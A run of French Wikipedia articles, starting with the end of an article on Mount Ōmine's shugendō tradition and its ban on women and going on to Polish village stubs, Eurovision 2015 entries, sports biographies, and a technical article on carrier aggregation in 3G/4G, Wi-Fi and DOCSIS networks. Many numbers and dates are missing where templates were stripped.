En 1872, au cours de l'ère Meiji, le gouvernement impérial interdit toutes les « pratiques superstitieuses », dont la croyance en des créatures folkloriques telles que les yōkai et yūrei ainsi que les interdictions relatives au sexe sur les montagnes sacrées comme le mont Fuji et tous les rituels du mont Ōmine. Durant cette période la montagne est rendue inaccessible et toutes les pratiques shugendō se déroulent en secret. Cependant, en 1945 la loi sur la culture japonaise abroge ces édits et la montagne est à nouveau ouverte à tous. Les pratiquants du shugendō retournent promptement sur le mont et restaurent leurs traditions.
En 1964, l'alpiniste et auteur Kyūya Fukada désigne le mont Ōmine à la de sa liste des 100 montagnes célèbres du Japon. Les trois critères de Fukuda pour la sélection de ses 100 célèbres montagnes sont leur grandeur physique, leur importance historique et spirituelle pour le Japon et leur individualité, ce qui signifie qu'elles doivent posséder une forme unique, un phénomène ou un événement qui leur est associés. En 1980, une superficie de dans la région des monts Ōmine et Ōdaigahara est classée réserve pour l'homme et la biosphère par l'UNESCO.
En 2004, l'UNESCO l'ajoute à sa liste du patrimoine mondial sous l'intitulé "Sites sacrés et chemins de pèlerinage dans les monts Kii". Cette sélection est considérée comme mettant un terme à la controverse entourant l'interdiction de la montagne aux randonneuses car elle a reçu une approbation officielle de l'UNESCO.
Interdiction aux femmes.
Traditionnellement, les femmes au Japon ne sont pas autorisées à gravir les montagnes sacrées aux religions du shinto. Bien que les origines de ces traditions soient obscures, ces zones sont interdites aux personnes impures comme celles qui ont récemment eu un décès dans leur famille ou les femmes menstruées, ce qui est considéré comme lié aux concepts shinto d'impureté, en particulier l'« impureté du sang » provoquée par la menstruation et l'accouchement.
Les autres montagnes sacrées ont différentes traditions, comme la ségrégation des sexes selon la saison, permettant aux femmes de grimper à certains moments et aux hommes de le faire à d'autres. On pense que la raison de cette interdiction est d'éliminer les pensées de tentation des moines "yamabushi" censés pratiquer l'abnégation stricte d'un ermite isolé dans la montagne. Finalement, les interdictions sont appelées et ne concernent que les femmes.
Le mont Ōmine est le centre de la religion shugendō, pratique ascétique de longue tradition. En raison de la diminution du nombre des pratiquants de l'ascétisme dans le Japon moderne, la plupart des montagnes liées au shugendō ne sont plus utilisées pour les retraites spirituelles mais sont à présent des attractions touristiques. Par conséquent, ces sites, hormis le mont Ōmine, ont supprimé leurs restrictions fondées sur le sexe.
Seul le conserve l'interdiction aux femmes. Le qui constitue une partie du mont Ōmine, est réservé aux femmes et souvent appelé , « Ōmine des femmes ». Le temple le plus sacré de la religion shugendō se trouve sur la colline Yamagaoka et un panneau à l'entrée de la montagne indique "No Women Admitted" en anglais et en japonais. Le mont Athos en Grèce, site chrétien orthodoxe, dispose d'une interdiction similaire adressée aux femmes. Des violations ont lieu chaque année par des militantes féministes mais aucune plainte n'a jamais été déposée. Chaque fois que la limite est dépassée, le temple et la communauté locale émettent une demande pour que les gens respectent leurs religion et tradition.
L'interdiction a été contestée à plusieurs reprises, mais sans succès. Ses partisans font valoir que la ségrégation sexuelle n'est pas égale à la discrimination sexuelle. Les partisans de l'interdiction indiquent également que celle-ci a une tradition ininterrompue de . La désignation du mont Ōmine comme site du patrimoine mondial de l'humanité par l'UNESCO a été considérée par les critiques de l'interdiction comme ayant donné un sceau d'approbation à la pratique de ségrégation.
Épreuves de courage.
Il existe trois "shugyo" sur le mont Ōmine, chacune étant supposée renforcer le pouvoir spirituel du candidat. Les grimpeurs qui ne souhaitent pas passer les tests peuvent facilement les contourner.

</doc>
<doc id="8978050" url="https://fr.wikipedia.org/wiki?curid=8978050" title="Wierzbica-Kolonia">
Wierzbica-Kolonia

Wierzbica-Kolonia (prononciation : ) est un village polonais de la gmina de Wierzbica dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au sud-ouest de Wierzbica (siège de la "gmina"), au sud-ouest de Radom (siège du "powiat") et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978054" url="https://fr.wikipedia.org/wiki?curid=8978054" title="Zalesice (Mazovie)">
Zalesice (Mazovie)

Zalesice (prononciation : ) est un village polonais de la gmina de Wierzbica dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'est de Wierzbica (siège de la "gmina"), au sud de Radom (siège du "powiat") et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978055" url="https://fr.wikipedia.org/wiki?curid=8978055" title="Markus Bösiger">
Markus Bösiger

Markus Bösiger, né le , est un pilote de vitesse motos et de camions suisse, entrepreneur de la commune de Huttwil dans le canton de Berne
Biographie.
Il dispute durant près de dix ans des compétitions internationales de sidecars, notamment en championnat du monde de vitesse moto entre 1991 et 1993 ( classé alors aux Pays-Bas).
Il effectue des courses de camions depuis 1999, avec une interruption en 2009.
Il remporte le Championnat d'Europe de courses de camions en 2007 sur un Buggyra "Freightliner", terminant par trois fois vice-champion continental, en 2001 (catégorie "Super-Race-Trucks", sur MAN), en 2008 (sur Buggyra) et en 2010 (ainsi qu'alors champion d'Europe par équipe avec son équipier -champion d'Europe individuel "Super-Race-Trucks" en 2004- l'Allemand Markus Oestreich, pour l'équipe "MKR Technology" sur Renault Premium). 
Il s'occupe par ailleurs des destinées du club de hockey sur glace des Huttwil Falcons à compter de 2009, club champion de première ligue en 2011.

</doc>
<doc id="8978056" url="https://fr.wikipedia.org/wiki?curid=8978056" title="Zalesice">
Zalesice

Zalesice peut désigner :
Toponymie.
en Pologne :

</doc>
<doc id="8978059" url="https://fr.wikipedia.org/wiki?curid=8978059" title="Johann Friedrich Ahlfeld (médecin)">
Johann Friedrich Ahlfeld (médecin)

Johann Friedrich Ahlfeld est, né le à Alsleben et mort le à Marbourg, un gynécologue allemand connu pour l'introduction de la désinfection des mains à l'alcool dans les domaines de l'obstétrique et la chirurgie.
Biographie.
Johann Friedrich Ahlfeld fait ses études à Greifswald et à Leipzig, où il fut l'assistant de (1819-1892). Il poursuit ses études à Vienne et à Tübingen et obtient son doctorat en médecine le . En 1876, il devient professeur d'obstétrique à Leipzig et en 1881 il accepte une invitation à Giessen comme professeur d'obstétrique et de directeur de l'institution d'enseignement pour les sages-femmes. En 1883, il est appelé à l'université de Marbourg comme professeur d'obstétrique et directeur de l'école royale des sages-femmes. En 1894, il devient conseiller médical privé.
Il est destitué de ses fonctions officielles en 1909 et meurt à Marbourg en 1929.
Méthode Ahlfeld.
La méthode Ahlfeld consistait à se laver les mains à l'eau chaude et de se les rincer à l'alcool. Cette technique utilisée en obstétrique est obsolète.

</doc>
<doc id="8978062" url="https://fr.wikipedia.org/wiki?curid=8978062" title="Zalesice-Kolonia (Mazovie)">
Zalesice-Kolonia (Mazovie)

Zalesice-Kolonia (prononciation : ) est un village polonais de la gmina de Wierzbica dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978063" url="https://fr.wikipedia.org/wiki?curid=8978063" title="Zalesice-Kolonia">
Zalesice-Kolonia

Zalesice-Kolonia peut désigner :
Toponymie.
en Pologne

</doc>
<doc id="8978064" url="https://fr.wikipedia.org/wiki?curid=8978064" title="Bijoux, hot-dogs et tasses de thé">
Bijoux, hot-dogs et tasses de thé

Bijoux, hot-dogs et tasses de thé ("") est un téléfilm américain réalisé par George Schaefer en 1992.
Synopsis.
Pendant Noel , le cambrioleur devint l'invité de la vieille dame.

</doc>
<doc id="8978067" url="https://fr.wikipedia.org/wiki?curid=8978067" title="Anton Höfle">
Anton Höfle

Anton Höfle est un homme politique allemand, né le à Otterbach (Royaume de Bavière) et mort le à Berlin (Allemagne).
Membre du Zentrum, il est ministre des Postes de 1923 à 1924.

</doc>
<doc id="8978068" url="https://fr.wikipedia.org/wiki?curid=8978068" title="Alpha lactalbumine">
Alpha lactalbumine



</doc>
<doc id="8978072" url="https://fr.wikipedia.org/wiki?curid=8978072" title="Alpha1 Canum Venaticorum">
Alpha1 Canum Venaticorum



</doc>
<doc id="8978074" url="https://fr.wikipedia.org/wiki?curid=8978074" title="Alphonse Liebert">
Alphonse Liebert



</doc>
<doc id="8978075" url="https://fr.wikipedia.org/wiki?curid=8978075" title="Johann Friedrich Ahlfeld">
Johann Friedrich Ahlfeld

Johann Friedrich Ahlfeld peut désigner :

</doc>
<doc id="8978078" url="https://fr.wikipedia.org/wiki?curid=8978078" title="Marco Venturini">
Marco Venturini

Marco Venturini (né le à Pistoia) est un tireur sportif italien, spécialiste de la fosse olympique. 
Aux Jeux olympiques d'été de 1992 à Barcelone, il remporte la médaille de bronze en inscrivant 218 points. Il participe aussi aux Jeux olympiques d'été de 1996, 2000 et 2004, terminant respectivement aux , et .

</doc>
<doc id="8978083" url="https://fr.wikipedia.org/wiki?curid=8978083" title="James Eichberger">
James Eichberger

James Paul Eichberger Aguirre (né le à Greenbrae, mais dont la mère est de Los Mochis, dans le Sinaloa) est un athlète mexicain, spécialiste du demi-fond.
Il détient le record national du 800 m en 1 min 45 s 88, obtenu à Ninove le .

</doc>
<doc id="8978084" url="https://fr.wikipedia.org/wiki?curid=8978084" title="Agrégation de porteuses">
Agrégation de porteuses

L’agrégation de porteuses (en anglais : "Carrier Aggregation" ou "CA") est une technique utilisée dans les réseaux de communications mobiles, dans les dernières générations de Wi-Fi et sur certains réseaux filaires afin d'augmenter le débit de données d’un utilisateur du réseau.
Plusieurs bandes de fréquences sont regroupées et attribuées à un utilisateur ce qui permet d’augmenter la vitesse maximale de transfert des données qui devient proportionnelle au nombre de porteuses utilisées. Les ressources radioélectriques peuvent ainsi être distribuées avec plus de souplesse entre les utilisateurs d'un réseau. 
L'agrégation de porteuses a commencé à être utilisée au début des années 2000 sur les réseaux mobiles 3G pour augmenter la rapidité de la transmission des données pour un utilisateur. On obtient ainsi du 3G̟+ : DC-HSDPA, DC-HSUPA, HSPA+, puis du 4G LTE, du 4G+ et la 5G. Ces avantages techniques bénéficient autant aux opérateurs qu'aux utilisateurs. Les multiples fréquences radio, tant montantes que descendantes, sont attribuées à plusieurs opérateurs mobiles opérant dans les mêmes blocs de spectre. Elles sont généralement attribuées via des enchères et des autorisations par des autorités réglementaires nationales telles l'Arcep en France. 
En 3G, "DC" veut dire double porteuse ("dual carrier"), cela signifie que la technologie employée utilise simultanément deux bandes de fréquence émises par une tour de téléphonie mobile.
Utilisation.
Réseaux mobiles UMTS / HSPA+.
La largeur de bande utile d’une porteuse d’un réseau mobile 3G UMTS / HSPA est d'environ avec un espacement de entre les fréquences centrales des porteuses. La dernière génération de l'UMTS : HSPA+ apporte l’agrégation de porteuses (le "Dual Carrier") qui permet à un utilisateur d’utiliser deux canaux de téléchargement. L’agrégation de porteuses DC-HSPA+ est aussi appelée « double cellule » (). Le 3GPP a normalisé l’agrégation de porteuses pour HSPA+ dans les versions 8 et 9 (rel.8 et 9) des normes 3G UMTS ; elle autorise pour la liaison montante un maximum de deux canaux (porteuses) et un maximum de quatre canaux pour la liaison descendante. 
En pratique, en 2015, les réseaux 3G HSPA+ existants (H+) n’utilisent que 2 porteuses agrégées dans le sens descendant () et une seule porteuse en liaison montante, ce qui permet d’atteindre un débit crête théorique de en .
Réseaux 4G LTE Advanced.
Lors de son lancement commercial en 2010, le LTE (versions 8 et 9 des normes 3GPP) prenait en charge différentes largeurs de bande, mais était « mono-porteuse » (en réalité deux bandes de fréquences sont utilisées en LTE FDD : une pour la liaison montante, l'autre pour la liaison descendante) ; chaque porteuse peut avoir une largeur de , , , , ou . 
En LTE Advanced (rel.10, 11, 12 et 13 des normes 3GPP), des ressources radio situées sur deux, trois ou quatre porteuses (ou plus) peuvent être agrégées et attribuées, à un instant donné, à un seul utilisateur ce qui permet d’augmenter son débit crête. Les porteuses agrégées peuvent avoir des largeurs différentes, par exemple pour deux porteuses : un canal primaire à et un canal secondaire de et peuvent être contiguës ou pas; les informations de contrôle et de signalisation circulent sur le canal primaire (""), les porteuses secondaires apportant un supplément de débit.
Les normes LTE Advanced publiées par le 3GPP (rel.12) permettent d’agréger jusqu’à 4 ou 8 porteuses (terminaux catégories 8, 14 et 16) ; la version suivante de la norme, parue en 2016 (rel.13) permet théoriquement d’agréger jusqu’à 32 porteuses (terminaux catégorie 17 en liaison descendante) pour pouvoir utiliser les bandes de fréquence « "unlicensed" » (ne nécessitant pas d'autorisation administrative) des ; les canaux de la bande doivent être partagés avec les réseaux Wi-Fi 802.11n, 11ac et 802.11ax.
En LTE Advanced et en 5G, les porteuses agrégées peuvent être situées dans des bandes de fréquence différentes (CA inter-bande) ou dans la même bande de fréquence, l’une à côté de l'autre (CA intra-bande, porteuses contiguës) ou encore dans la même bande de fréquences mais avec un espace entre les fréquences des porteuses agrégées.
Réseaux Wi-Fi.
Les normes de réseau local IEEE 802.11 (communément désignées par le terme Wi-Fi) utilisent des canaux radio de de largeur ; dans les premières générations de Wi-Fi, un seul canal de était utilisé par chaque point d'accès puis attribué dynamiquement aux terminaux Wi-Fi en mode half-duplex (c’est-à-dire alternativement en émission puis en réception). 
Depuis la publication des normes IEEE 802.11n en 2009, puis IEEE 802.11ac en 2013 et IEEE 802.11ax en 2021, les canaux (porteuses) peuvent être agrégés par groupes de 2 (norme 802.11n) puis par groupes de 2, 4 ou 8 avec les normes 802.11ac et 802.11ax, c’est-à-dire jusqu’à de largeur de bande. En Wi-Fi, les canaux agrégés doivent être adjacents.
L’agrégation à grande échelle (4 ou 8 canaux) n’est possible que dans les bandes de fréquences des et des (norme 802.11ax).
Cette agrégation permet d’augmenter considérablement le débit des points d’accès et des terminaux Wi-Fi compatibles.
Réseaux câblés DOCSIS.
DOCSIS est une norme permettant l'accès à Internet en utilisant les anciens réseaux de télévision par câble coaxial, combiné à de la fibre optique (réseaux HFC). 
Les normes Docsis historiques (1.0 et 2.0) utilisaient la bande passante du câble coaxial (environ ) découpée en canaux de 6 ou ( en Europe : norme EuroDocsis). Un seul canal TV (une seule porteuse de ) était utilisé pour transmettre les données Internet vers un abonné.
Avec la norme Docsis 3.0 publiée en 2006, plusieurs des canaux hérités de la télévision par câble et les porteuses associées peuvent être regroupés et agrégés sur la liaison descendante, par groupes de 2, 4, 8, 16 ou 24. Cela permet la transmission de données et l'accès à Internet à très haut débit (de 100 à en 2015). La norme 3.1 (publiée en 2014) permettra de dépasser en agrégeant des bandes de fréquences plus larges.
Techniques d’agrégation.
Les deux variantes principales.
Il existe deux techniques principales pour agréger des porteuses radioélectriques dans le but de transporter un flux de données plus élevé vers ou depuis un utilisateur du réseau : 
Avantages et inconvénients des 2 variantes.
La première technique consistant à moduler indépendamment les porteuses a l’avantage de la simplicité et permet de réutiliser plus facilement les composants matériels des précédentes générations, par exemple : les accélérateurs HW réalisant la transformée de Fourier de 2048x2048 définie par les normes LTE (codage OFDMA) ; cette taille de FFT limite la largeur de la bande de fréquences d'une porteuse LTE à . 
Cette solution rend plus simple la cohabitation dans un même réseau de terminaux avec et sans CA, elle permet aussi d’agréger des porteuses situées dans des bandes de fréquences différentes (par exemple : et ) et de largeurs différentes.
Elle oblige, par contre, à conserver les « bandes de garde » autour de chaque porteuse : en HSPA+ (24 % de la largeur de la bande de fréquence), environ en LTE (10 % d'une bande de ) et environ en Docsis (16 %), ce qui diminue le débit crête potentiel.
La deuxième variante qui regroupe les bandes de fréquences agrégées en une seule porteuse est spectralement plus efficace ; on conserve dans ce cas seulement 2 « bandes de garde » (pour éviter les interférences) : une de « chaque côté » de la nouvelle porteuse ; par contre, cette technique entraîne une rupture de compatibilité avec les anciens matériels « sans agrégation » et avec les terminaux existants ; elle implique un matériel plus complexe : capable de traiter plus de sous porteuses en parallèle (cas des modulations basées sur l'OFDM), donc avec une « transformée de Fourier » de plus grande taille à calculer en , même quand le trafic est faible. Cette technique n’est applicable que si les porteuses agrégées utilisent des bandes de fréquence contiguës ; c’est par exemple le cas des réseaux Wi-Fi utilisant la bande des et des réseaux câblés DOCSIS.
Choix du nombre de porteuses.
Selon le type de réseau, les porteuses peuvent être attribuées statiquement ou dynamiquement aux utilisateurs du réseau par le point d’accès (Wi-Fi), l'eNode B (4G) ou le CMTS (réseau câblé).
Dans le cas des réseaux câblés Docsis et des réseaux Wi-Fi, l’attribution d’une ou plusieurs porteuses agrégées est faite lors de la connexion d’un terminal au point d'accès, en fonction des capacités du terminal (nombre de canaux / porteuses supportés) et des ressources spectrales (porteuses) disponibles. Cette attribution de fréquences s’accompagne généralement de l’attribution d’une adresse IP et reste valable pendant toute la durée de la session. 
Dans le cas des réseaux mobiles (HSPA+ et LTE Advanced), l’allocation est dynamique, la connexion initiale et la signalisation ont lieu sur la porteuse primaire () ; les (ou la) porteuse(s) secondaires sont attribuées ou supprimées dynamiquement (plusieurs fois par seconde en LTE) en fonction du débit nécessaire au terminal et en fonction des ressources radio disponibles dans les cellules radio concernées. Ceci permet un partage plus efficace de la ressource radio entre plusieurs terminaux.

</doc>
<doc id="8978085" url="https://fr.wikipedia.org/wiki?curid=8978085" title="Noise pop">
Noise pop

La noise pop est un sous-genre de rock alternatif ayant émergé au milieu des années 1980 aux États-Unis et au Royaume-Uni mêlant bruit et/ou effet Larsen dissonant, instrumentation mélodique et éléments de production trouvées dans la musique pop, ce qui en fait un noise rock plus mélodique.
Histoire.
La noise pop est considérée Il mêle interprétation conventionnelle pop et guitares distordues. The Velvet Underground contribue significativement au genre, grâce à leur expérience de l'effet Larsen et sur la distorsion de leurs premiers albums. The Membranes, un groupe underground des années 1980, utilise le terme de pour décrire un précurseur plus bruitiste de cette scène. Des premiers groupes américains de rock alternatif comme Sonic Youth, Yo La Tengo et Dinosaur Jr. mêlent la structure des chansons rock et la distorsion de la guitare. Le premier album de The Jesus and Mary Chain, "" (1985), est considéré comme l'archétype du genre noise pop. Kareem Estefan de cite l'album pour 
À la fin des années 1980, la noise pop est une inspiration majeure du mouvement shoegazing britannique. Inspiré par The Jesus and Mary Chain, le groupe de rock gothique My Bloody Valentine se lance dans une expérimentation de la fusion entre musique pop des années 1960 et bruitisme sur leur EP, "", ce qui inspirera ainsi le futur son shoegazing. La noise pop continue à inspirer la scène rock indépendant dans les années 1990.

</doc>
<doc id="8978086" url="https://fr.wikipedia.org/wiki?curid=8978086" title="Psyttalia lounsbury">
Psyttalia lounsbury



</doc>
<doc id="8978092" url="https://fr.wikipedia.org/wiki?curid=8978092" title="Mont Kōmyō">
Mont Kōmyō

Le est une montagne culminant à d'altitude dans la préfecture de Niigata au Japon.

</doc>
<doc id="8978093" url="https://fr.wikipedia.org/wiki?curid=8978093" title="Bieniędzice">
Bieniędzice

Bieniędzice (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978097" url="https://fr.wikipedia.org/wiki?curid=8978097" title="Eremias montanus">
Eremias montanus



</doc>
<doc id="8978099" url="https://fr.wikipedia.org/wiki?curid=8978099" title="Chruślice (Mazovie)">
Chruślice (Mazovie)

Chruślice (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'ouest de Radom (siège du "powiat") et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978103" url="https://fr.wikipedia.org/wiki?curid=8978103" title="Franciszków (Radom)">
Franciszków (Radom)

Franciszków (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978105" url="https://fr.wikipedia.org/wiki?curid=8978105" title="Garno">
Garno

Garno (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au sud de Wolanów (siège de la "gmina"), à l'ouest de Radom (siège du "powiat") et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978107" url="https://fr.wikipedia.org/wiki?curid=8978107" title="Alberto Alvarez Muñoz">
Alberto Alvarez Muñoz



</doc>
<doc id="8978108" url="https://fr.wikipedia.org/wiki?curid=8978108" title="Israël au Concours Eurovision de la chanson 2015">
Israël au Concours Eurovision de la chanson 2015

Israël a annoncé en 2014 sa participation au Concours Eurovision de la chanson 2015 à Vienne, en Autriche. 
Nadav Guedj, représentant l'Israël au Concours Eurovision de la chanson, est annoncé le , à la suite de sa victoire lors du télé-crochet "HakoKhav HaBa 2015", émission nommée Rising Star dans les autres pays. 
Sa chanson "Golden Boy" est présentée le .
Sélection.
L'artiste représentant le pays a été sélectionné via l'émission "HaKoKhav HaBa", version locale de "The Rising Star". Nadav Guedj ayant remporté la finale, le , il représente Israël à l'Eurovision 2015. Sa chanson est, quant à elle, sélectionnée en interne et présentée le . Elle s'intitule "Golden Boy"
À l'Eurovision.
Israël participe à la seconde demi-finale, le . Y arrivant avec 151 points, le pays se qualifia pour la finale. Ce fut la première qualification du pays depuis 2010. Lors de celle-ci, Israël se classe en place avec 97 points.

</doc>
<doc id="8978114" url="https://fr.wikipedia.org/wiki?curid=8978114" title="Nordine Taleb">
Nordine Taleb

Nordine Taleb, né le à Saint-Tropez (Var), est un pratiquant professionnel franco-canadien d'arts martiaux mixtes (MMA). Il combat actuellement à l'Ultimate Fighting Championship dans la catégorie des poids mi-moyens. Il s'entraîne entre le Tristar Gym de Montréal et le Tiger Muay-thai Gym de Phuket. Il est entraîné et coaché par Xavier Lafaye, grand nom du Muay-thaï Français.
À l'été 2017, il est recruté par Neymar pour assurer sa protection rapprochée.

</doc>
<doc id="8978119" url="https://fr.wikipedia.org/wiki?curid=8978119" title="Lettonie au Concours Eurovision de la chanson 2015">
Lettonie au Concours Eurovision de la chanson 2015

La Lettonie a annoncé en 2014 sa participation au Concours Eurovision de la chanson 2015 à Vienne, en Autriche. 
Aminata Savadogo, représentant la Lettonie au Concours Eurovision de la chanson avec sa chanson "Love injected", est annoncée le , à la suite de sa victoire lors de la finale nationale "Supernova 2015".
Processus de sélection.
Format.
En 2015, la Lettonie revoit entièrement son processus de sélection et instaure l'émission "Supernova". Pour cette première édition, la sélection sera constituée de deux auditions, d'une demi-finale et d'une finale et réunira vingt artistes.
Dix artistes participeront à chaque audition. De ces dix artistes, à chaque fois quatre seront qualifiés pour la demi-finale : deux par le vote du jury, et deux grâce au télévote letton. La demi-finale se déroulera de la même manière. Quatre artistes parmi les huit restants seront qualifiés pour la finale : deux par le vote du jury, et deux grâce au télévote letton. Enfin, la finale désignera le représentant de la Lettonie à l'Eurovision 2015 parmi les quatre artistes encore en lice.
À l'Eurovision.
La Lettonie participa à la seconde demi-finale, le . Y arrivant avec , le pays se qualifie pour la finale. C'est la première qualification du pays depuis 2008. Lors de la finale, la Lettonie termine avec .

</doc>
<doc id="8978124" url="https://fr.wikipedia.org/wiki?curid=8978124" title="Franco Vázquez">
Franco Vázquez

Franco Damián Vázquez, né le à en Argentine, est un footballeur italo-argentin international argentin qui joue au poste de milieu offensif. Il évolue actuellement à l'US Cremonese.
Biographie.
Carrière en club.
Il fait ses débuts avec l'US Palerme le 8 janvier 2012 contre Naples. Il participe à 14 rencontres mais ne marque aucun but. 
Il est prêté au Rayo Vallecano de Madrid pour la saison 2012-2013. Il finit la saison avec 3 buts marqués en 19 rencontres disputés. Le Rayo Vallecano finit à la huitième place du championnat d'Espagne. 
Pour la saison 2013-2014, l'US Palerme évolue en Série B. Il finit la saison en ayant inscrit 4 buts en 18 matchs de championnat. Son équipe remporte le championnat et accède en Série A. 
Pour la saison 2014-2015, il forme un duo d'attaque avec Paulo Dybala et inscrit 10 buts en 37 rencontres de championnat. Il prolonge son contrat le 16 janvier 2015 jusqu'au 30 juin 2019.
Le 16 juillet 2016, Vázquez signe au Séville FC pour cinq saisons.
Carrière en sélection.
Le 21 mars 2015, il est convoqué pour la première fois en équipe d'Italie par Antonio Conte pour deux rencontres contre la Bulgarie et l'Angleterre.
Il joue son premier match en équipe nationale le 31 mars 2015 lors d'un match amical contre l'Angleterre. Il entre à la à la place d'Éder (1-1).
En août 2017, il déclare vouloir jouer avec le pays qui l'a vu naître. Il est sélectionné pour la première fois en septembre 2018 pour participer aux matchs amicaux de l'équipe nationale Argentine. Il a pu effectuer sa première sélection le 7 septembre 2018 face au Guatemala (3-0) après avoir signé une dérogation, qui indique qu'il refuse de jouer pour n'importe quel autre équipe que l'Argentine désormais.
Statistiques.
Ce tableau présente les statistiques en carrière de Franco Vázquez.

</doc>
<doc id="8978125" url="https://fr.wikipedia.org/wiki?curid=8978125" title="Carrier Aggregation">
Carrier Aggregation



</doc>
<doc id="8978126" url="https://fr.wikipedia.org/wiki?curid=8978126" title="Azerbaïdjan au Concours Eurovision de la chanson 2015">
Azerbaïdjan au Concours Eurovision de la chanson 2015

L'Azerbaïdjan a annoncé en 2014 sa participation au Concours Eurovision de la chanson 2015 à Vienne, en Autriche. 
Elnur Hüseynov, représentant l'Azerbaïdjan au Concours Eurovision de la chanson, est annoncé le , à la suite d'une sélection interne. Il avait déjà représenté le pays lors du Concours Eurovision de la chanson 2008 avec Samir Javadzadeh.
Sa chanson "Hour of the Wolf" est présentée le également.
À l'Eurovision.
L'Azerbaïdjan participa à la seconde demi-finale, le . Le pays y termine avec , ce qui lui permet de se qualifier pour la finale du . Lors de celle-ci, l'Azerbaïdjan se classe avec .

</doc>
<doc id="8978129" url="https://fr.wikipedia.org/wiki?curid=8978129" title="Islande au Concours Eurovision de la chanson 2015">
Islande au Concours Eurovision de la chanson 2015

L'Islande a annoncé en 2014 sa participation au Concours Eurovision de la chanson 2015 à Vienne, en Autriche. 
María Ólafsdóttir est sélectionnée comme représentante le , à la suite de sa victoire lors de la finale nationale "Söngvakeppni Sjónvarpsins 2015" avec sa chanson "Unbroken".
Sélection.
Format.
La sélection est constituée de trois émissions et réunit douze artistes et leurs chansons. Tout d'abord, deux demi-finales ont lieu. Chacune voit six artistes participer puis trois d'entre eux se qualifient via le télévote islandais. Au terme des deux demi-finales, un des artistes éliminés est repêché par un jury de professionnels. 
Lors de la finale, les sept artistes encore en lice participent. Après un premier tour vote deux artistes se qualifient pour la . Le télévote seul sélectionne alors le vainqueur de la sélection lors d'un deuxième tour de vote parmi les deux artistes encore en lice.
Chansons.
Les douze chansons sont interprétées en islandais lors des demi-finales. Lors de la finale cependant, les artistes interprètent les chansons telles qu'ils souhaitent les présenter à l'Eurovision, ce qui inclut la traduction dans une autre langue.
À l'Eurovision.
L'Islande participe à la seconde demi-finale, le . Arrivant avec , le pays échoue à se qualifier en finale. C'est le premier échec du pays depuis 2007.

</doc>
<doc id="8978130" url="https://fr.wikipedia.org/wiki?curid=8978130" title="Libre Parcours (album, 2015)">
Libre Parcours (album, 2015)



</doc>
<doc id="8978133" url="https://fr.wikipedia.org/wiki?curid=8978133" title="Slovénie au Concours Eurovision de la chanson 2015">
Slovénie au Concours Eurovision de la chanson 2015

La Slovénie a annoncé en 2014 sa participation au Concours Eurovision de la chanson 2015 à Vienne, en Autriche. Le pays est représenté par le groupe Maraaya, et sa chanson "Here for you", sélectionnés lors de la finale nationale "EMA 2015".
Sélection.
Format.
La sélection se déroule en une soirée, présentée par trois anciennes représentantes de la Slovénie , et réunit huit participants. Dans un premier temps, les huit participants interprètent leur chanson. Les présentatrices, agissant alors comme un jury de professionnelles, sélectionnent alors deux d'entre eux pour la "superfinale". Lors de celle-ci le télévote sélectionne le représentant de la Slovénie pour l'Eurovision 2015.
Émission.
La sélection est remportée par le duo Maraaya et leur chanson "Here for you".
À l'Eurovision.
La Slovénie a participé à la seconde demi-finale, le . Y terminant avec 92 points, le pays se qualifie pour la finale du , où il termine à la place avec 39 points.

</doc>
<doc id="8978137" url="https://fr.wikipedia.org/wiki?curid=8978137" title="Pologne au Concours Eurovision de la chanson 2015">
Pologne au Concours Eurovision de la chanson 2015

La Pologne a annoncé en 2014 sa participation au Concours Eurovision de la chanson 2015 à Vienne, en Autriche. Le pays est représenté par Monika Kuszyńska et sa chanson "In the name of love".
Processus de sélection.
Monika Kuszyńska, représentant la Pologne au Concours Eurovision de la chanson, est annoncée le , à la suite d'une sélection interne. Sa chanson est présentée à la même date.
À l'Eurovision.
La Pologne a participé à la deuxième demi-finale, le . Elle y termine avec 57 points, ce qui lui permet de se qualifier pour la finale du . Lors de celle-ci, le pays termine avec 10 points.

</doc>
<doc id="8978138" url="https://fr.wikipedia.org/wiki?curid=8978138" title="Remets ton péplum !">
Remets ton péplum !

Remets ton péplum ! ("") est un roman policier de l’écrivain australien Carter Brown publié en 1969 aux États-Unis, puis en 1970 en Australie. 
Le roman est traduit en français en 1970 dans la Série noire. La traduction, prétendument "de l'américain", est signée France-Marie Watkins. C'est une des nombreuses aventures du lieutenant Al Wheeler, bras droit du shérif Lavers dans la ville californienne fictive de "Pine City" ; la trente-deuxième traduite aux Éditions Gallimard. Le héros est aussi le narrateur.
Résumé.
